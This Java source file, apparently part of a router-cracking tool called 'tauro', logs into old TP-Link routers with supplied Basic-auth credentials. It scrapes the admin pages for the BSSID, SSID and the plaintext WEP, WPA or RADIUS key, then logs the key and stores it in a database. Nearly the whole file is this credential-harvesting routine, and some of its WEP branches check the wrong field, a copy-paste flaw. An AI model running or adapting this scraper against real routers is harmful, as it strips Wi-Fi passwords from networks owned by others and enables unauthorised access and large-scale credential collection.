/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import com.gargoylesoftware.htmlunit.ElementNotFoundException;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.html.HtmlPage;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScraper;
import org.koreops.tauro.core.db.DbConnEngine;
import org.koreops.tauro.core.exceptions.DbDriverException;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for TP-Link Routers.
 *
 * <p>For older models where SSID settings and security are on the same page. The
 * only model found for this so far is TL-WR543G</p>
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class TpLinkScraper extends AbstractScraper {

  public TpLinkScraper(String host, String hostUrl, AuthCrackParams params) {
    super(host, hostUrl, params);
  }

  @Override
  public boolean scrapeAndLog() throws DbDriverException {
    return this.logNewTpLinkStation();
  }

  private boolean logNewTpLinkStation() throws DbDriverException {
    try {

      Document doc = Jsoup.connect(hostUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Logger.debug(host + ": Title: " + doc.title());

      if (!(tpLinkTitles.contains(doc.title()))) {
        Logger.debug(host + ": Not an Old TP Link router.");
        return false;
      }

      System.out.println("Found Old TP-LINK");

      webClient.addRequestHeader("Authorization", "Basic " + base64Login);
      HtmlPage mainPage = webClient.getPage(hostUrl);

      doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());

      Elements elements = doc.select("table#autoWidth tbody tr");

      String macAddr = "";
      boolean wifiAvailable = false;

      for (Element element : elements) {
        if (element.select("td") != null) {
          if ("Wireless".equalsIgnoreCase(element.select("td").text())) {
            wifiAvailable = true;
          }
        }
        if (wifiAvailable) {
          if (element.select("td.Item") != null) {
            if (element.select("td.Item").text().contains("MAC Address")) {
              // Found the wifi Mac. Log & exit before we pick up the next mac..
              macAddr = element.select("td:eq(1)").text();
              macAddr = macAddr.replace("-", ":");
              System.out.println("\n\n\n\n\n\n\n\n\n\n\n" + macAddr);
              Logger.info(host + ": Found MAC: " + macAddr);
              break;
            }
          }
        }
      }

      if (!wifiAvailable) {
        Logger.error(host + ": Wifi not available.", true);
        return false;
      }

      Map<String, String> wifiData = new HashMap<>();

      wifiData.put("BSSID", macAddr.toLowerCase());

      System.out.println(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());
      doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());
      elements = doc.select("html");
      if (!"".equals(elements.get(0).select("input#ssid[name=ssid1]").val())) {
        wifiData.put("SSID", elements.get(0).select("input#ssid[name=ssid1]").val());
      }

      if (wifiData.get("SSID") == null) {
        wifiData.put("SSID", elements.get(0).select("input#ssid[name=ssid]").val());
      }

      Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));

      Element element = elements.get(0); // Only one html in page.

      for (Element e : element.select("select#secType option")) {
        if ("selected".equalsIgnoreCase(e.attr("selected"))) {
          wifiData.put("AuthType", e.text());
        }
      }

      if (wifiData.get("AuthType") == null) {
        System.out.println("Not an old TP-Link");
      }

      if ((wifiData.get("AuthType") != null) && wifiData.get("AuthType").contains("WEP")) {

        if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key1]").val());
          for (Element e : element.select("select#length1 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        } else if (!"disabled".equalsIgnoreCase(element.select("input[name=key2]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key2]").val());
          for (Element e : element.select("select#length2 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        } else if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key3]").val());
          for (Element e : element.select("select#length3 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        } else if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key4]").val());
          for (Element e : element.select("select#length4 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        if (!"".equals(elements.get(0).select("input#pskSecret").val())) {
          wifiData.put("AuthType", "WPA/WPA2 Personal");
          wifiData.put("key", elements.get(0).select("input#pskSecret").val());
          for (Element e : elements.select("select#encrptType option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        if (!"".equals(elements.get(0).select("input#radiusSecret").val())) {
          wifiData.put("AuthType", "WPA/WPA2 Personal");
          wifiData.put("key", elements.get(0).select("input#radiusSecret").val());
          for (Element e : elements.select("select#wpaCipher option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        Logger.debug(host + ": Security disabled or not a standard router. Either way, not our concern.");
        return false;
      }

      Logger.info(host + ": Found key: " + wifiData.get("key"));
      Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
      Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));

      UpdaterDao.saveStation(wifiData, host, DbConnEngine.getConnection());

      return true;
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (FailingHttpStatusCodeException ex) {
      Logger.error(host + ": FailingHttpStatusCodeException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (ElementNotFoundException ex) {
      Logger.error(host + ": ElementNotFoundException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    } catch (DbDriverException ex) {
      throw ex;
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }

  /**
   * Parses Old Ones. One version of this used HTMLUnit for the scraping.
   * But HTMLUnit was way too heavy. This method may just be deprecated now.
   * TODO Get this in use.
   *
   * @param mainPage    The mainPage obtained from the router.
   * @param wifiData    The wifiData Map to store the WiFi details.
   */
  @Deprecated
  private void parseOldOnes(HtmlPage mainPage, Map<String, String> wifiData) {
    Document doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());

    System.out.println(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());

    Elements elements = doc.select("select#secType");

    for (Element element : elements) {
      if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
        wifiData.put("AuthType", "WEP");
        wifiData.put("key", element.select("input[name=key1]").val());
        for (Element e : element.select("select#length1 option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
        break;
      }
      if (!"disabled".equalsIgnoreCase(element.select("input[name=key2]").attr("disabled"))) {
        wifiData.put("AuthType", "WEP");
        wifiData.put("key", element.select("input[name=key2]").val());
        for (Element e : element.select("select#length2 option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
        break;
      }
      if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
        wifiData.put("AuthType", "WEP");
        wifiData.put("key", element.select("input[name=key3]").val());
        for (Element e : element.select("select#length3 option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
        break;
      }
      if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
        wifiData.put("AuthType", "WEP");
        wifiData.put("key", element.select("input[name=key4]").val());
        for (Element e : element.select("select#length4 option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
        break;
      }
    }

    if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
      if (!"".equals(elements.get(0).select("input#pskSecret").val())) {
        wifiData.put("AuthType", "WPA/WPA2 Personal");
        wifiData.put("key", elements.get(0).select("input#pskSecret").val());
        for (Element e : elements.select("select#pskCipher option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
      }
    }

    if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
      if (!"".equals(elements.get(0).select("input#radiusSecret").val())) {
        wifiData.put("AuthType", "WPA/WPA2 Personal");
        wifiData.put("key", elements.get(0).select("input#radiusSecret").val());
        for (Element e : elements.select("select#wpaCipher option")) {
          if ("selected".equalsIgnoreCase(e.attr("selected"))) {
            wifiData.put("Encryption", e.text());
          }
        }
      }
    }
  }
}
